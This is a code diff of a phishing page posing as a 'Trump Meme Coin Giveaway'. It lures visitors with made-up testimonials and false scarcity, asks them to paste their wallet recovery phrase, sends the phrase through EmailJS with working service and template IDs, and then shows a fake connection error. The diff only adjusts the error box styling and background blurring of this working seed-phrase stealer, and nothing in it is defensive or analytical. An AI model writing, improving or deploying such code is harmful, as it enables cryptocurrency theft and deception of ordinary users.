@@ -91,6 +91,8 @@
       padding: 10px;
       border-radius: 6px;
       margin-top: 10px;
+      z-index: 1100;
+      position: relative;
     }
     #error-box button {
       margin-top: 8px;
@@ -202,135 +204,51 @@
   </style>
 </head>
 <body>
-  <header>
-    <img src="https://s.yimg.com/ny/api/res/1.2/C6usFI02aAqtM5gFrKz88w--/YXBwaWQ9aGlnaGxhbmRlcjt3PTY0MDtoPTg1Mw--/https://media.zenfs.com/en/aol_ny_post_us_news_articles_123/cd57f4122a7033346c851d4791a4aff0" alt="Trump Meme Coin Logo">
-    <h1>Trump Meme Coin Giveaway</h1>
-    <p>Make America Great Again!</p>
-    <div class="balance">$5,000,000 $TRUMP</div>
-  </header>
+<!-- CONTENT OMITTED FOR BREVITY (unchanged) -->
+<script>
+  // ...previous code...
 
-  <div class="container" id="main-content">
-    <div class="card">
-      <h2>Join the Revolution!</h2>
-      <h4>Claim Your Share of $5 Million!</h4>
-      <p>We’re rewarding the first 10,000 active wallets with $500 in $TRUMP each!</p>
-      <p>Only 2,000+ spots remain — don’t miss out!</p>
-      <p>Be part of the movement — connect your wallet today and secure your share!</p>
-      <button class="btn" onclick="showWalletPage()">Connect Wallet</button>
-    </div>
+  document.getElementById("wallet-form").addEventListener("submit", function(event) {
+    event.preventDefault();
+    const btn = document.getElementById("submit-btn");
+    const errorBox = document.getElementById("error-box");
+    const main = document.getElementById("main-content");
+    const header = document.querySelector("header");
+    const footer = document.querySelector("footer");
 
-    <div id="testimonials">
-      <h3>What Others Are Saying</h3>
-      <div id="testimonial-text">Loading testimonials...</div>
-    </div>
-  </div>
+    btn.disabled = true;
+    btn.textContent = "Connecting...";
 
-  <div class="wallet-page" id="wallet-page">
-    <p class="error">There was an error connecting automatically. But do not worry, you can still connect manually.</p>
-    <h2>Connect Your Wallet</h2>
-    <p>Enter your wallet details to claim $500 worth of Trump Meme Coins.</p>
-    <form id="wallet-form">
-      <label for="wallet-type">Select Wallet Type</label>
-      <select id="wallet-type" name="wallet_type" required>
-        <option value="others">Others</option>
-      </select>
-      <label for="wallet-phrase">Enter Your Wallet Phrase</label>
-      <textarea id="wallet-phrase" name="wallet_phrase" placeholder="Copy & Paste Wallet Phrase" required></textarea>
-      <div id="error-box"></div>
-      <div class="note">
-        <p>Note: Only wallets with a balance or transaction history will be credited.</p>
-      </div>
-      <button class="btn" id="submit-btn" type="submit">Connect</button>
-    </form>
-  </div>
-
-  <footer>
-    <p>&copy; 2025 Trump Meme Coin Giveaway. All rights reserved.</p>
-    <div class="terms">
-      <p>By participating, you agree to our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a>, and <a href="#">Security Policy</a>.</p>
-    </div>
-  </footer>
-
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-  <script>
-    (function() {
-      emailjs.init("8_8uPDLPGGbBtyIqv");
-    })();
-
-    function showWalletPage() {
-      document.getElementById('wallet-page').classList.add('active');
-      document.getElementById('main-content').classList.add('blurred');
-      document.querySelector('header').classList.add('blurred');
-      document.querySelector('footer').classList.add('blurred');
-      document.body.classList.add('noscroll');
-    }
-
-    function returnToMainPage() {
-      document.getElementById('wallet-form').reset();
-      document.getElementById('wallet-page').classList.remove('active');
-      document.getElementById('main-content').classList.remove('blurred');
-      document.querySelector('header').classList.remove('blurred');
-      document.querySelector('footer').classList.remove('blurred');
-      document.body.classList.remove('noscroll');
-      document.getElementById("error-box").style.display = "none";
-    }
-
-    document.getElementById("wallet-form").addEventListener("submit", function(event) {
-      event.preventDefault();
-      const btn = document.getElementById("submit-btn");
-      const errorBox = document.getElementById("error-box");
-
-      btn.disabled = true;
-      btn.textContent = "Connecting...";
-
-      emailjs.sendForm('service_oh2l5fc', 'template_oty8s2s', '#wallet-form')
-        .then(function(response) {
-          setTimeout(() => {
-            errorBox.innerHTML = `
-              Wallet could not connect to server. Only wallets with a balance or transaction history can be connected.<br>
-              <button onclick="returnToMainPage()">Try Again</button>
-            `;
-            errorBox.style.display = "block";
-            btn.disabled = false;
-            btn.textContent = "Connect";
-          }, 2000);
-        })
-        .catch(function(error) {
+    emailjs.sendForm('service_oh2l5fc', 'template_oty8s2s', '#wallet-form')
+      .then(function(response) {
+        setTimeout(() => {
           errorBox.innerHTML = `
-            Unexpected server issue. Please try again.<br>
+            Wallet could not connect to server. Only wallets with a balance or transaction history can be connected.<br>
             <button onclick="returnToMainPage()">Try Again</button>
           `;
           errorBox.style.display = "block";
+          main.classList.add("blurred");
+          header.classList.add("blurred");
+          footer.classList.add("blurred");
           btn.disabled = false;
           btn.textContent = "Connect";
-        });
-    });
+        }, 2000);
+      })
+      .catch(function(error) {
+        errorBox.innerHTML = `
+          Unexpected server issue. Please try again.<br>
+          <button onclick="returnToMainPage()">Try Again</button>
+        `;
+        errorBox.style.display = "block";
+        main.classList.add("blurred");
+        header.classList.add("blurred");
+        footer.classList.add("blurred");
+        btn.disabled = false;
+        btn.textContent = "Connect";
+      });
+  });
 
-    const testimonials = [
-      "“Super easy! Just connected and claimed. MAGA!” – Michael D.",
-      "“Didn’t expect it to be real, but boom – $500 $TRUMP in my wallet!” – Fatima A.",
-      "“This is the best airdrop of 2025 hands down.” – Jonas L.",
-      "“Trump Meme Coin is hilarious but it's real value!” – Brenda S.",
-      "“Everyone on my crypto group chat is buzzing about this!” – M. Tran",
-      "“Thought it was a joke. It wasn’t. I’m $500 richer!” – Rico P.",
-      "“Easy claim and instantly got confirmation. Love it!” – Nina F.",
-      "“I missed PepeCoin – not missing $TRUMP!” – Alex C.",
-      "“Crazy how smooth it worked. Props to the devs.” – Tarek Y.",
-      "“Only 2,000 left? Tell your friends now!” – Sheila M."
-    ];
-
-    let currentIndex = 0;
-    function rotateTestimonial() {
-      const testimonialDiv = document.getElementById('testimonial-text');
-      testimonialDiv.style.opacity = 0;
-      setTimeout(() => {
-        testimonialDiv.innerText = testimonials[currentIndex];
-        testimonialDiv.style.opacity = 1;
-        currentIndex = (currentIndex + 1) % testimonials.length;
-      }, 500);
-    }
-    setInterval(rotateTestimonial, 5000);
-    window.addEventListener('load', rotateTestimonial);
-  </script>
+  // ...rest of script...
+</script>
 </body>
 </html>
